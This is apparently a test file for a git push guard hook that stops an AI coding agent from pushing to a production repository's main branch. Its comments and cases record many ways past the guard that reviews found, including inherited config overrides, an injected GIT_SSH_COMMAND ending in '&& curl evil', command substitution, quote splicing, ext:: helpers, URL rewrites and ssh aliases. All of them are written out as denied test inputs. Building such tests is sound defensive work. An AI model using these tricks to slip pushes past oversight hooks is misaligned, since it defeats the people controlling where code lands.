      // denied a bare push over a value git would not have consulted.
      //
      // Reproduced on git 2.43.0 before fixing: under `push.default=current`,
      // `push --dry-run --porcelain` reports `refs/heads/feature:refs/heads/feature`
      // with `branch.feature.merge=refs/heads/main` set and unset alike, while the
      // same pair under `upstream` reports `…:refs/heads/main` only when it is set.
      const mergeOverride = {
        GIT_CONFIG_COUNT: "1",
        GIT_CONFIG_KEY_0: "branch.main.merge",
        GIT_CONFIG_VALUE_0: "refs/heads/elsewhere",
      };
      try {
        git(["config", "push.default", "current"], work);
        assert.equal(
          runHook(barePush, mergeOverride).decision, "allow",
          "under push.default=current a bare push never reads branch.merge, so an inherited value is inert",
        );
        // The control that keeps that skip from widening into a fail-open: the
        // identical override under a mode that DOES consult the key moves where
        // this push lands, and must still die.
        git(["config", "push.default", "upstream"], work);
        const denied = runHook(barePush, mergeOverride);
        assert.equal(denied.decision, "deny", "under push.default=upstream the same inherited branch.merge is denied");
        assert.match(denied.reason, /branch\.merge/, "the denial names the answer that changed");
        // Unset is git's own default `simple`, which reads the key — absence must
        // not read as permission to skip.
        git(["config", "--unset", "push.default"], work);
        assert.equal(
          runHook(barePush, mergeOverride).decision, "deny",
          "with push.default unset the default mode consults branch.merge, so the override still denies",
        );
        // And the mode itself arriving through the SAME inherited channel must not
        // be able to buy the skip: read scrubbed, this repo is on the default mode.
        assert.equal(
          runHook(barePush, {
            GIT_CONFIG_COUNT: "2",
            GIT_CONFIG_KEY_0: "push.default", GIT_CONFIG_VALUE_0: "current",
            GIT_CONFIG_KEY_1: "branch.main.merge", GIT_CONFIG_VALUE_1: "refs/heads/elsewhere",
          }).decision,
          "deny",
          "an inherited push.default=current cannot silence the branch.merge it arrives with",
        );
      } finally {
        git(["config", "--unset", "push.default"], work);
      }
    }
    {
      // The `remotes` lookup carried the same unscoped shape as `remote.*.push`:
      // `git remote -v` lists EVERY remote, but a push consults only the one it
      // resolves to. An inherited `remote.<other>.url` adds a `(push)` line on the
      // ambient side alone, so the decision sets differed and denied a push that
      // could not have touched that remote.
      assert.equal(
        runHook(featurePush, {
          GIT_CONFIG_COUNT: "1",
          GIT_CONFIG_KEY_0: "remote.mirrorbox.url",
          GIT_CONFIG_VALUE_0: path.join(tmp, "mirrorbox.git"),
        }).decision,
        "allow",
        "an inherited remote this push never selects does not change where it goes",
      );
      // The control: the same override on the remote this push DOES select is the
      // redirect the comparison exists to catch.
      const denied = runHook(featurePush, {
        GIT_CONFIG_COUNT: "1",
        GIT_CONFIG_KEY_0: "remote.origin.url",
        GIT_CONFIG_VALUE_0: CRX_URL,
      });
      assert.equal(denied.decision, "deny", "the same override on the selected remote is still denied");
      assert.match(denied.reason, /remotes/, "the denial names the answer that changed");
    }
    {
      // 2026-08-06, Codex's PR #313 review — the round where the accumulated
      // over-refusal fixes turn fail-OPEN one layer down. A remote name is NOT a
      // whitespace-delimited token: `git remote add` rejects a space, but writing
      // `remote.<name>.url` straight into the config creates one git then honours
      // — verified here that `git remote` lists `my remote`, `remote -v` prints it
      // TAB-separated, and `get-url --push 'my remote'` resolves it.
      //
      // Both scope parsers read that name as `my`, which matches no scope entry,
      // so the SELECTED remote's own lines were filtered out of BOTH comparison
      // sets and an inherited pushurl aimed at production compared equal. Codex's
      // repro, replayed: resolve the remote through `branch.<b>.remote` so the
      // name must survive scoping, then redirect it at the app repo.
      git(["config", "remote.my remote.url", path.join(tmp, "spaced.git")], work);
      git(["config", "branch.main.remote", "my remote"], work);
      try {
        assert.ok(
          git(["remote"], work).stdout.split("\n").includes("my remote"),
          "premise: git itself lists the whitespace-named remote",
        );
        assert.equal(
          runHook(remotelessPush, {
            GIT_CONFIG_COUNT: "1",
            GIT_CONFIG_KEY_0: "remote.my remote.pushurl",
            GIT_CONFIG_VALUE_0: CRX_URL,
          }).decision,
          "deny",
          "a redirect on the whitespace-named remote this push selects is not filtered away",
        );
        // The allow direction still holds for the same name shape: a whitespace-named
        // remote this push does NOT select must stay narrowable, or the fix above
        // would just be the over-refusal coming back.
        assert.equal(
          runHook(featurePush, {
            GIT_CONFIG_COUNT: "1",
            GIT_CONFIG_KEY_0: "remote.my remote.push",
            GIT_CONFIG_VALUE_0: "HEAD:refs/heads/elsewhere",
          }).decision,
          "allow",
          "a whitespace-named remote this push never selects is still narrowed away",
        );
      } finally {
        git(["config", "--unset", "branch.main.remote"], work);
        git(["config", "--remove-section", "remote.my remote"], work);
      }
    }
    {
      // The same lookup-by-known-name question one key over, and the reason the
      // config-key parser cannot use a delimiter guess either: the remote name
      // sits between two dots, so a greedy `^remote\.(.*)\.(?:push|mirror)\b`
      // backtracks to the LAST match in the whole line — including one inside the
      // VALUE. A refspec may legally contain dots, verified here: git prints
      // `remote.origin.push HEAD:refs/heads/evil.push`, which keyed as
      // `origin.push HEAD:refs/heads/evil` and so belonged to no scope, dropping
      // the redirecting line from both sets. Same fail-open shape as above.
      const denied = runHook(barePush, {
        GIT_CONFIG_COUNT: "1",
        GIT_CONFIG_KEY_0: "remote.origin.push",
        GIT_CONFIG_VALUE_0: "HEAD:refs/heads/evil.push",
      });
      assert.equal(
        denied.decision, "deny",
        "a default refspec whose VALUE ends in .push still keys to the remote it belongs to",
      );
      assert.match(denied.reason, /remote\.\*\.push/, "the denial names the answer that changed");
    }
    {
      // 2026-08-06, Codex's PR #313 review — the tenth over-refusal of this shape
      // and one level below the `push.default` MODE check above. That check asks
      // which mode is in force; this one asks whether the mode is reached at all.
      // `remote.<name>.push` outranks the whole mechanism, so when it is set a
      // bare push consults neither `push.default` nor `branch.<b>.merge`.
      //
      // Reproduced on git 2.43.0 before fixing, and the precedence is TOTAL:
      // with `remote.origin.push=HEAD:refs/heads/fixed`, `push origin` dry-runs to
      // `HEAD:refs/heads/fixed` under `current`, `upstream`, `matching`, `nothing`,
      // and unset alike, with `branch.<b>.merge` set or unset. Codex reported the
      // `push.default` half; the probe showed `branch.merge` rides along.
      git(["config", "remote.origin.push", "HEAD:refs/heads/fixed"], work);
      try {
        assert.equal(
          runHook(barePush, {
            GIT_CONFIG_COUNT: "1",
            GIT_CONFIG_KEY_0: "push.default", GIT_CONFIG_VALUE_0: "current",
          }).decision,
          "allow",
          "with remote.<n>.push supplying the refspec, an inherited push.default is inert",
        );
        assert.equal(
          runHook(barePush, {
            GIT_CONFIG_COUNT: "1",
            GIT_CONFIG_KEY_0: "branch.main.merge", GIT_CONFIG_VALUE_0: "refs/heads/elsewhere",
          }).decision,
          "allow",
          "the same precedence makes an inherited branch.merge inert",
        );
        // The control that stops this becoming a fail-open: the key that actually
        // supplies the refspec is still compared, so changing IT still denies.
        const denied = runHook(barePush, {
          GIT_CONFIG_COUNT: "1",
          GIT_CONFIG_KEY_0: "remote.origin.push",
          GIT_CONFIG_VALUE_0: "HEAD:refs/heads/hijacked",
        });
        assert.equal(denied.decision, "deny", "changing remote.<n>.push itself is the redirect and still denies");
        assert.match(denied.reason, /remote\.\*\.push/, "the denial names the answer that changed");
      } finally {
        git(["config", "--unset", "remote.origin.push"], work);
      }
      // And the skip must not survive the key's absence: with no
      // `remote.origin.push`, `push.default` is consulted again and an inherited
      // one that changes the destination must still deny. (git's default mode is
      // `simple`, which refuses a mismatched upstream; `current` pushes to the
      // like-named branch — a genuine difference in where the objects land.)
      git(["config", "branch.main.merge", "refs/heads/other"], work);
      try {
        assert.equal(
          runHook(barePush, {
            GIT_CONFIG_COUNT: "1",
            GIT_CONFIG_KEY_0: "push.default", GIT_CONFIG_VALUE_0: "current",
          }).decision,
          "deny",
          "without remote.<n>.push the mode is consulted again and an inherited one denies",
        );
      } finally {
        git(["config", "--unset", "branch.main.merge"], work);
      }
    }
    assert.equal(
      runHook(push, { GIT_SSH_COMMAND: "ssh -o ServerAliveInterval=20" }).decision,
      "allow",
      "an inherited transport variable is not a destination override",
    );

    // Round 7: config ROOT overrides, arbitrary inline variables, and an option
    // the argv walk cannot account for.
    deniedBecause(`HOME=/tmp/evil ${push}`, /HOME/, "inline HOME override");
    deniedBecause(`XDG_CONFIG_HOME=/tmp/evil ${push}`, /XDG_CONFIG_HOME/, "inline XDG_CONFIG_HOME override");
    deniedBecause(`$env:HOME = "/tmp/evil"; ${push}`, /HOME/, "PowerShell HOME override");
    deniedBecause(`SOME_NEW_GIT_VAR=x ${push}`, /SOME_NEW_GIT_VAR/, "any inline assignment the allowlist does not name");
    deniedBecause(`git --exec-path=${tmp} push origin main`, /--exec-path/, "git's executable-helper override");
    deniedBecause(`$verb='push'; git $verb origin HEAD:main`, /subcommand must be written literally/, "PowerShell-expanded Git subcommand");
    for (const option of ["--no-optional-locks", "--paginate", "--bare", "--glob-pathspecs"]) {
      deniedBecause(`git ${option} push origin HEAD:main`, /unrecognised Git global options/, `${option} before push`);
    }
    deniedBecause(`PATH=${tmp}; ${push}`, /PATH/, "an earlier PATH replacement");
    deniedBecause(`$env:PATHEXT = '.MJS'; ${push}`, /PATHEXT/, "an earlier PowerShell PATHEXT replacement");
    deniedBecause(`git -C ${work} push --recurse-submodules no ${CRX_URL} HEAD:main`, /codex/i, "--recurse-submodules hiding the real destination");
    deniedBecause(`git -C ${work} push --some-future-option x origin main`, /--some-future-option/, "an option the guard cannot account for");
    // Round 9, end-to-end: an arbitrary GIT_SSH_COMMAND, and a production URL
    // spelled so a raw suffix match misses it.
    deniedBecause(
      `GIT_SSH_COMMAND="sh -c 'ssh prod git-receive-pack repo.git'" ${push}`,
      /GIT_SSH_COMMAND/, "an arbitrary command in GIT_SSH_COMMAND",
    );
    deniedBecause(
      `GIT_SSH_COMMAND="ssh -o ServerAliveInterval=20 && curl evil" ${push}`,
      /GIT_SSH_COMMAND/, "a separator inside the quoted value does not hide the assignment",
    );
    deniedBecause(
      `git -C ${work} push https://github.com/masonwells1/./CRX_Manager_V1.0.git HEAD:main`,
      /codex/i, "a `.` segment does not disguise the production destination",
    );
    assert.equal(
      runHook(`GIT_SSH_COMMAND="ssh -o ServerAliveInterval=20" ${push}`).decision,
      "allow",
      "the documented keepalive prefix still works",
    );

    // Round 10, end-to-end: `\"` is an escaped quote, not a delimiter. A tracker
    // blind to escapes reopened the quote at that point and swallowed every later
    // separator, so the whole line read as ONE segment and the main-bound push at
    // the end was never classified. Codex's probe returned exactly that.
    deniedBecause(
      `echo "a\\"b" && git -C ${work} push origin feature && git -C ${work} push ${CRX_URL} HEAD:main`,
      /codex/i,
      "an escaped quote cannot hide a later main-bound push",
    );
    // Found while building the case above: a command substitution is not separated
    // by `;`/`&&`/`|` at all, so no splitter of any kind sees the push hidden
    // inside it. The inner command runs first — straight to production — while the
    // guard classifies the harmless outer push. Denied outright now.
    deniedBecause(
      `git -C ${work} push origin feature \`git push ${CRX_URL} HEAD:main\``,
      /substitution/i,
      "a push carrying a backtick substitution is refused",
    );
    deniedBecause(
      `git -C ${work} push origin $(git push ${CRX_URL} HEAD:main)`,
      /substitution/i,
      "and the $(...) spelling too",
    );

    // Round 11, end-to-end: GitHub's port-443 SSH endpoint reaches the production
    // repo from a checkout with no CRX remote at all, and on hostname alone it read
    // as somewhere unrelated — so the risky-diff proof gate was skipped entirely.
    deniedBecause(
      `git -C ${work} push ssh://git@ssh.github.com:443/masonwells1/CRX_Manager_V1.0.git HEAD:main`,
      /codex/i,
      "the port-443 ssh endpoint does not disguise the production destination",
    );

    // Round 16, end-to-end: an ssh_config Host alias. `github-crx` is local text
    // that resolves to github.com on the pushing machine, so from a checkout with
    // no CRX remote at all this pushed straight to production while the guard
    // classified the destination as an unrelated host and skipped the proof gate.
    deniedBecause(
      `git -C ${work} push github-crx:masonwells1/CRX_Manager_V1.0.git HEAD:main`,
      /codex/i,
      "an ssh Host alias does not disguise the production destination",
    );
    deniedBecause(
      `git -C ${work} push ssh://git@github-crx/masonwells1/CRX_Manager_V1.0.git HEAD:main`,
      /codex/i,
      "nor does the ssh:// spelling of the same alias",
    );

    // Round 19, end-to-end: the hook itself must refuse a command that only
    // becomes a push after the shell rewrites it. Analysing text the shell will
    // not execute proves nothing about where the objects land.
    deniedBecause(
      `git p"us"h origin HEAD:main`,
      /quoting or command substitution/i,
      "quote-spliced `push` is refused by the hook, not analysed",
    );
    deniedBecause(
      `$(git push origin HEAD:main)`,
      /quoting or command substitution/i,
      "and so is a command substitution that runs a push",
    );
    deniedBecause(
      "`git push origin HEAD:main`",
      /quoting or command substitution/i,
      "and the backtick spelling of it",
    );
    deniedBecause(
      "git pu`sh origin HEAD:main",
      /quoting or command substitution/i,
      "and a PowerShell backtick escape cannot splice `push` past the hook",
    );
    deniedBecause(
      'cmd /d /c "git pu^sh origin HEAD:main"',
      /quoting or command substitution/i,
      "and cmd.exe caret escaping cannot splice `push` past the hook",
    );
    deniedBecause(
      "git ('pu'+'sh') origin HEAD:main",
      /quoting or command substitution/i,
      "and PowerShell expression concatenation cannot build `push` past the hook",
    );
    deniedBecause(
      "git --% push origin HEAD:main",
      /quoting or command substitution/i,
      "and PowerShell's stop-parsing token cannot hide `push` from the hook",
    );
    deniedBecause(
      "git pu\\sh origin HEAD:main",
      /quoting or command substitution/i,
      "and a POSIX shell backslash escape cannot splice `push` past the hook",
    );
    deniedBecause(
      `git push origin HEAD:ma"in"`,
      /quoting or command substitution/i,
      "quote splicing cannot disguise the main destination from the hook",
    );
    deniedBecause(
      `git push origin feature && git p"us"h origin HEAD:main`,
      /quoting or command substitution/i,
      "a visible harmless push cannot hide a second main-bound push",
    );
    deniedBecause(
      `git push origin feature && git p"us"h --force origin feature`,
      /quoting or command substitution/i,
      "a visible harmless push cannot hide a second force push",
    );

    // Round 18, end-to-end: git's remote-helper syntax hands delivery to an
    // arbitrary program, so `ext::…` names the production repo while every
    // destination classifier answered "unrelated" (Codex's own probe). The rule
    // is inverted rather than extended — a leftover colon in a destination that
    // did not canonicalize means the guard cannot resolve it, so it gates.
    deniedBecause(
      `git -C ${work} push "ext::ssh git@github.com %S masonwells1/CRX_Manager_V1.0.git" HEAD:main`,
      /codex/i,
      "a remote-helper destination naming the production repo is gated, not waved through",
    );
    deniedBecause(
      `git -C ${work} push "ext::ssh relay-host %S someone/anything.git" HEAD:main`,
      /codex/i,
      "and so is one naming anything else, because an opaque transport is unresolvable",
    );
    deniedBecause(
      `git -C ${work} push "transport::whatever" HEAD:main`,
      /codex/i,
      "any helper transport, not just the ext:: spelling",
    );

    // Round 17, end-to-end: `--receive-pack`/`--exec` name the program that
    // INGESTS the push on the far side, so the destination the guard classifies
    // is not necessarily where the objects end up. Codex's probe confirmed such
    // a command parsed cleanly, targeted `main`, and made every guarded-repo
    // classifier answer "unrelated" — the proof gate skipped entirely.
    deniedBecause(
      `git -C ${work} push --receive-pack=/tmp/relay origin HEAD:main`,
      /receive-pack/i,
      "a custom receive-pack program is denied before the destination is even classified",
    );
    deniedBecause(
      `git -C ${work} push --receive-pack /tmp/relay origin HEAD:main`,
      /receive-pack/i,
      "including the separate-value spelling",
    );
    deniedBecause(
      `git -C ${work} push --exec=/tmp/relay origin HEAD:main`,
      /receive-pack/i,
      "and its `--exec` alias",
    );
    // The option list still fails closed on an abbreviation, so `--receive-p`
    // does not slip past the exact-match check above.
    deniedBecause(
      `git -C ${work} push --receive-p /tmp/relay origin HEAD:main`,
      /--receive-p/,
      "an abbreviated spelling is refused as an unknown option",
    );

    // Round 12, end-to-end: a transport variable set in a segment of its OWN.
    // Every per-push-prefix detector reported clean while the push ran whatever
    // that variable names — Codex's own probe demonstrated it.
    deniedBecause(
      `export GIT_SSH_COMMAND="sh -c 'ssh prod git-receive-pack repo.git'"; ${push}`,
      /GIT_SSH_COMMAND/,
      "a transport variable exported in an earlier segment is not out of scope",
    );
    deniedBecause(
      `$env:GIT_SSH_COMMAND = "sh -c 'ssh prod git-receive-pack repo.git'"; ${push}`,
      /GIT_SSH_COMMAND/,
      "and its PowerShell spelling",
    );
    deniedBecause(`GIT_PROXY_COMMAND=/tmp/evil ${push}`, /GIT_PROXY_COMMAND/, "a proxy command is a command too");
    deniedBecause(`export GIT_ASKPASS=/tmp/evil; ${push}`, /GIT_ASKPASS/, "so is an askpass helper");
    // Inherited rather than written: unlike GIT_CONFIG*, sharing the environment
    // does NOT neutralise this — it changes what the push runs, not what the
    // guard reads.
    {
      const result = runHook(push, { GIT_SSH_COMMAND: "sh -c 'ssh prod git-receive-pack repo.git'" });
      assert.equal(result.decision, "deny", "an inherited transport variable denies");
      assert.match(result.reason || "", /GIT_SSH_COMMAND/, "and the denial names it");
    }
    assert.equal(
      runHook(push, { GIT_SSH_COMMAND: "ssh -o ServerAliveInterval=20" }).decision,
      "allow",
      "an inherited keepalive value in the documented shape still works",
    );
    assert.equal(
      runHook(`export GIT_SSH_COMMAND="ssh -o ServerAliveInterval=20"; ${push}`).decision,
      "allow",
      "and the same value written in an earlier segment",
    );

    // Round 22, end-to-end: a repository selector inherited from the shell. The
    // command is an ordinary push; the guard's own lookups strip these variables
    // so they read the real checkout, which is exactly why the two disagree.
    {
      const result = runHook(push, { GIT_DIR: path.join(work, ".git-elsewhere") });
      assert.equal(result.decision, "deny", "an inherited GIT_DIR is denied");
      assert.match(result.reason, /GIT_DIR/, "and the denial names it");
    }
    {
      const result = runHook(push, { GIT_WORK_TREE: work });
      assert.equal(result.decision, "deny", "so is an inherited GIT_WORK_TREE");
      assert.match(result.reason, /GIT_WORK_TREE/, "and the denial names that too");
    }
    assert.equal(runHook(push, { GIT_DIR: "" }).decision, "allow", "an empty selector is not a selection");

    // Round 21, end-to-end: the STORED twins of round 17's `--receive-pack`.
    // Nothing about the command line is unusual — the checkout itself remembers
    // a program to hand the objects to, so the destination the guard reads is
    // not where they land. The scratch `origin` is an unrelated local repo, and
    // it is still denied: an unreadable destination is the point, not the repo.
    for (const [key, value] of [
      ["remote.origin.receivepack", "/tmp/relay"],
      ["core.sshCommand", "ssh -i /tmp/relay"],
      ["remote.origin.vcs", "relay"],
    ]) {
      try {
        git(["config", key, value], work);
        const result = runHook(push);
        assert.equal(result.decision, "deny", `a stored ${key} is denied`);
        assert.match(result.reason, /name a program to carry the push/, `and the denial names ${key}`);
        assert.match(result.reason, new RegExp(key.toLowerCase().replace(/\./g, "\\.")), "and quotes the setting itself");
      } finally {
        git(["config", "--unset", key], work);
      }
    }
    assert.equal(runHook(push).decision, "allow", "and unsetting them restores an ordinary push");

    // 2026-08-05 hoist regression: the transport-program and mirror-remote
    // checks used to sit AFTER `mainPushSource`'s `if (!srcRef) continue`, so
    // they only ever ran for a push already classified as main-bound. A
    // feature-branch push (this repo's `featurePush`, bound to `refs/heads/
    // feature`, never main) sailed straight past `continue` and skipped both
    // checks entirely — `core.sshCommand` allowed it outright. They were moved
    // above that early exit specifically so a non-main push is checked too.
    // This must fail if the classifier ever moves back below the exit: revert
    // the hoist and `featurePush` again resolves `srcRef === null`, hits
    // `continue`, and this assertion sees "allow" instead of "deny".
    try {
      git(["config", "core.sshCommand", "ssh -i /tmp/relay"], work);
      const result = runHook(featurePush);
      assert.equal(result.decision, "deny", "a feature-bound (non-main) push with core.sshCommand set is denied");
      assert.match(result.reason, /name a program to carry the push/, "the denial names the transport-program gate");
      assert.match(result.reason, /core\.sshcommand/, "and quotes the setting itself");
    } finally {
      git(["config", "--unset", "core.sshCommand"], work);
    }
    assert.equal(runHook(featurePush).decision, "allow", "and unsetting it restores the ordinary feature-branch push");

    // A named remote can push to every configured pushurl. The first URL is the
    // harmless local bare repo; the second invokes a custom remote helper that
    // can deliver the same objects anywhere. The hook must inspect them all.
    try {
      git(["remote", "set-url", "--add", "--push", "origin", dest], work);
      git(["remote", "set-url", "--add", "--push", "origin", "relay://example.invalid/harmless.git"], work);
      const multiplePushUrls = runHook(push);
      assert.equal(multiplePushUrls.decision, "deny", "a later unknown-transport pushurl is gated");
      assert.match(multiplePushUrls.reason, /CODEX GATE/, "the full hook explains the denial");
    } finally {
      git(["config", "--unset-all", "remote.origin.pushurl"], work);
    }
    {
      const result = runHook(push, { GIT_EXEC_PATH: path.join(tmp, "planted-git-helpers") });
      assert.equal(result.decision, "deny", "a planted inherited GIT_EXEC_PATH denies");
      assert.match(result.reason || "", /GIT_EXEC_PATH/, "and the denial names it");
    }

    // Git substitutes insteadOf as raw text, not path segments. The configured
    // base plus the suffix of this destination becomes the production URL.
    // Exercise the actual hook so its effective-URL lookup, not only the helper,
    // must see the completed repository name.
    try {
      git(["config", "url.git@github.com:masonwells1/CRX_.insteadOf", "crx:"], work);
      const partialRewrite = runHook(`git -C ${work} push crx:Manager_V1.0.git HEAD:main`);
      assert.equal(partialRewrite.decision, "deny", "a partial repository-name rewrite is gated end-to-end");
      assert.match(partialRewrite.reason, /CODEX GATE/, "the actual hook explains the production gate");
    } finally {
      git(["config", "--unset-all", "url.git@github.com:masonwells1/CRX_.insteadOf"], work);
    }

    // A mirror remote configured in the repository's OWN config. This diverges
    // from nothing, so the scrubbed-vs-ambient comparison cannot catch it — and
    // `mainPushSource` only ever reads command TEXT, so a bare `git push origin`
    // classifies as "touches no main" while git pushes every ref including main.
    // Codex's 2026-08-05 review; reproduced against real git before fixing.
    try {
      git(["config", "remote.origin.mirror", "true"], work);
      const localMirror = runHook(`git -C ${work} push origin`);
      assert.equal(localMirror.decision, "deny", "a mirror remote in the repo's own config is denied");
      assert.match(localMirror.reason, /mirror/i, "and the denial names the setting to unset");
    } finally {
      git(["config", "--unset-all", "remote.origin.mirror"], work);
    }
    // The same setting arriving through an inherited GIT_CONFIG*, which is the
    // exact vector reported: nothing in the compared lookups read it, so the
    // override compared equal and the push was allowed.
    {
      const inheritedMirror = runHook(`git -C ${work} push origin`, {
        GIT_CONFIG_COUNT: "1",
        GIT_CONFIG_KEY_0: "remote.origin.mirror",
        GIT_CONFIG_VALUE_0: "true",
      });
      assert.equal(inheritedMirror.decision, "deny", "an inherited mirror override is denied too");
    }
    // Control for the pair above: the same key set to false must still push.
    try {
      git(["config", "remote.origin.mirror", "false"], work);
      assert.equal(
        runHook(push).decision, "allow",
        "a mirror setting explicitly turned off denies nothing",
      );
    } finally {
      git(["config", "--unset-all", "remote.origin.mirror"], work);
    }

    // Controls: the guard must not have become a blanket denier. Both of these
    // run all the way through the destination lookups against the scratch repo.
    assert.equal(runHook(push).decision, "allow", "an ordinary push to an unrelated remote stays allowed");
    assert.equal(
      runHook(`GIT_SSH_COMMAND="ssh -o ServerAliveInterval=20" ${push}`).decision,
      "allow",
      "the documented SSH keepalive workaround is a transport option, not a destination override",
    );
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
}

console.log("OK - codex push shared library checks passed.");
